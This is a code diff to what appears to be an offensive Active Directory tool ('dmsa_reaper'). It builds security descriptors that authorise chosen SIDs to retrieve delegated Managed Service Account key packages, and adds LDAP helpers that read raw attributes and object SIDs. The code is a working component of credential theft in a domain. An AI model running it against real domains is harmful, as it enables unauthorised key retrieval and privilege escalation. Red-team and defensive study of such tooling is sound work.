@@ -6,6 +6,7 @@ from ldap3 import BASE, Connection
 from impacket.ldap import ldaptypes
 
 from dmsa_reaper.ldap.query import ensure_search_succeeded
+from dmsa_reaper.ldap.sid import entry_sid
 from dmsa_reaper.models import Operation
 from dmsa_reaper.utils import bytes_to_guid_le
 
@@ -46,18 +47,23 @@ DMSA_STATE_COMPLETED = 2
 DMSA_STATE_STANDALONE = 3
 
 
-def build_group_msa_membership_sd(principal_sid: str) -> bytes:
-    """Build the managed-password retrieval policy for one operator SID.
+def build_group_msa_membership_sd_for_sids(principal_sids: list[str]) -> bytes:
+    """Build a dMSA authorization descriptor for one or more SIDs.
 
     msDS-GroupMSAMembership is itself a self-relative security descriptor.  The
-    KDC uses it to decide whether the principal requesting a dMSA key package is
-    authorized.  The descriptor below is equivalent to the SDDL used by
-    BloodyAD's dMSA implementation:
+    KDC uses it to decide whether a principal requesting a dMSA key package is
+    authorized.  The 0x000F01FF mask deliberately expands GenericAll into its
+    specific rights.  The dMSA KDC authorization path does not expand the GA
+    generic-right bit, so using 0x10000000 here results in KDC_ERR_POLICY.
 
-        O:BAD:(A;;0xf01ff;;;<principal SID>)
+        O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)
     """
-    if not principal_sid or not principal_sid.upper().startswith("S-"):
-        raise ValueError("a valid operator principal SID is required for dMSA key retrieval")
+    unique_sids = list(dict.fromkeys(principal_sids))
+    if not unique_sids:
+        raise ValueError("at least one authorization SID is required")
+    for principal_sid in unique_sids:
+        if not principal_sid or not principal_sid.upper().startswith("S-"):
+            raise ValueError(f"invalid dMSA authorization SID: {principal_sid!r}")
 
     sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
     sd["Revision"] = b"\x01"
@@ -77,18 +83,24 @@ def build_group_msa_membership_sd(principal_sid: str) -> bytes:
     acl["Sbz2"] = 0
     acl.aces = []
 
-    ace = ldaptypes.ACE()
-    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-    ace["AceFlags"] = 0
-    allowed = ldaptypes.ACCESS_ALLOWED_ACE()
-    allowed["Mask"] = ldaptypes.ACCESS_MASK()
-    allowed["Mask"]["Mask"] = 0x000F01FF
-    allowed["Sid"] = ldaptypes.LDAP_SID()
-    allowed["Sid"].fromCanonical(principal_sid)
-    ace["Ace"] = allowed
-    acl.aces.append(ace)
+    for principal_sid in unique_sids:
+        ace = ldaptypes.ACE()
+        ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+        ace["AceFlags"] = 0
+        allowed = ldaptypes.ACCESS_ALLOWED_ACE()
+        allowed["Mask"] = ldaptypes.ACCESS_MASK()
+        allowed["Mask"]["Mask"] = 0x000F01FF
+        allowed["Sid"] = ldaptypes.LDAP_SID()
+        allowed["Sid"].fromCanonical(principal_sid)
+        ace["Ace"] = allowed
+        acl.aces.append(ace)
     sd["Dacl"] = acl
     return sd.getData()
+
+
+def build_group_msa_membership_sd(principal_sid: str) -> bytes:
+    """Backward-compatible single-principal authorization descriptor."""
+    return build_group_msa_membership_sd_for_sids([principal_sid])
 
 
 def build_dmsa_creation_attributes(
@@ -161,6 +173,28 @@ def read_attribute(conn: Connection, dn: str, attribute: str) -> list | None:
     return list(vals) if vals else None
 
 
+def read_raw_attribute(conn: Connection, dn: str, attribute: str) -> list | None:
+    """Read an LDAP attribute without schema-driven binary coercion."""
+    ok = conn.search(
+        search_base=dn,
+        search_filter="(objectClass=*)",
+        search_scope=BASE,
+        attributes=[attribute],
+    )
+    ensure_search_succeeded(conn, ok, f"read raw {attribute!r} on {dn!r}")
+    if not conn.entries:
+        return None
+    entry = conn.entries[0]
+    if attribute not in entry:
+        return None
+    attr = entry[attribute]
+    raw_values = getattr(attr, "raw_values", None)
+    if raw_values:
+        return list(raw_values)
+    values = getattr(attr, "values", None)
+    return list(values) if values else None
+
+
 def read_object_guid(conn: Connection, dn: str) -> str:
     """Read the server-assigned objectGUID immediately after object creation."""
     ok = conn.search(
@@ -188,6 +222,26 @@ def read_object_guid(conn: Connection, dn: str) -> str:
     if values:
         return str(values[0]).lower()
     raise RuntimeError(f"created object has an empty objectGUID: {dn}")
+
+
+def read_object_sid(conn: Connection, dn: str) -> str:
+    """Read the server-assigned objectSid for a newly created security principal."""
+    ok = conn.search(
+        search_base=dn,
+        search_filter="(objectClass=*)",
+        search_scope=BASE,
+        attributes=["objectSid"],
+    )
+    ensure_search_succeeded(conn, ok, f"read objectSid on {dn!r}")
+    if not conn.entries:
+        raise RuntimeError(f"created object cannot be re-read for SID journaling: {dn}")
+    entry = conn.entries[0]
+    if "objectSid" not in entry:
+        raise RuntimeError(f"created object has no readable objectSid: {dn}")
+    sid = entry_sid(entry["objectSid"])
+    if not sid:
+        raise RuntimeError(f"created object has an empty objectSid: {dn}")
+    return sid
 
 
 def journal_created_object(operation: Operation, conn: Connection, dn: str) -> str:
